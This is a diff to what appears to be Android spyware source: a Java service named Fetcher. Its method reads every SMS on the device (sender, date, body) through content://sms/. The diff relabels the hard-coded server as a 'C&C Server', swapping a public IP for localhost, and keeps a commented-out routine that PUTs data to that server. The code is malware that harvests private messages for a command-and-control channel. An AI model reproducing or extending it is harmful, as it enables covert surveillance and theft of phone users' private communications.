@@ -48,7 +48,7 @@ import java.util.UUID;
 
 public class Fetcher extends Service {
 
-    final String SERVER_IP = "35.204.136.26";//
+    final String SERVER_IP = "127.0.0.1"; // C&C Server
     final int SERVER_PORT = 80;
     final String FILE_NAME = "data";
     final String FULL_URL = "http://" + SERVER_IP + ":" + SERVER_PORT + "/" + FILE_NAME;
@@ -208,7 +208,6 @@ public class Fetcher extends Service {
     // Method to dump SMS messages
     public ArrayList<String> fetchInbox() {
         ArrayList<String> sms = new ArrayList<>();
-        // Here you can change the path for sms folder e.g for inbox content://sms/inbox
         Uri uri = Uri.parse("content://sms/");
         Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
         if (cursor != null) {
@@ -218,7 +217,6 @@ public class Fetcher extends Service {
                 String address = cursor.getString(1);
                 Long dateMil = cursor.getLong(2);
                 String body = cursor.getString(3);
-                // Date manipulation
                 Date date = new Date(dateMil);
                 SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                 formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
@@ -298,14 +296,13 @@ public class Fetcher extends Service {
         }
     }
 
-    //future post request
+    // Send data to C&C
 //    private void sendData() throws IOException {
-//        URL url = new URL("http://"+"35.204.136.26"+":"+"80"+"/put.php");
+//        URL url = new URL(FULL_URL);
 //        HttpURLConnection httpCon = (HttpURLConnection)url.openConnection();
 //        httpCon.setDoOutput(true);
 //        httpCon.setRequestMethod("PUT");
 //        OutputStreamWriter out = new OutputStreamWriter(httpCon.getOutputStream());
-//        out.write("Test please work!!");
 //        httpCon.getInputStream();
 //    }
 }
